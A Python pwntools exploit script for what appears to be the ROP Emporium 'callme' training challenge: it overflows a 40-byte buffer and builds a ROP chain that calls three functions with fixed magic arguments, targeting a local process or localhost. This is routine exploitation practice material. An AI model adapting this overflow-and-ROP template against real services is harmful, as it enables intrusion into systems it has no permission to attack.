#!/usr/bin/env python3

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
elf = context.binary = ELF('./callme')
context.bits = 64

#libc = elf.libc
rop = ROP(elf)

gs = '''
b pwnme
continue
'''

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote('127.0.0.1', 5555)
    else:
        return process(elf.path)
r = start()

#============ exploit here ================

junk = b'A'*40                      #buffer overflow
args = b''
args += p64(0xdeadbeefdeadbeef)
args += p64(0xcafebabecafebabe)
args += p64(0xd00df00dd00df00d)
poprdi = elf.sym.usefulGadgets      #pop rdi pop rsi pop rdx
callmeone = elf.sym.callme_one
callmetwo = elf.sym.callme_two
callmethree = elf.sym.callme_three
ret = rop.ret.address

payload = junk
payload += p64(poprdi)
payload += args
payload += p64(callmeone)
payload += p64(poprdi)
payload += args
payload += p64(callmetwo)
payload += p64(poprdi)
payload += args
payload += p64(callmethree)
payload += p64(ret)

r.sendlineafter('>', payload)

#============= interactive ================

r.interactive()
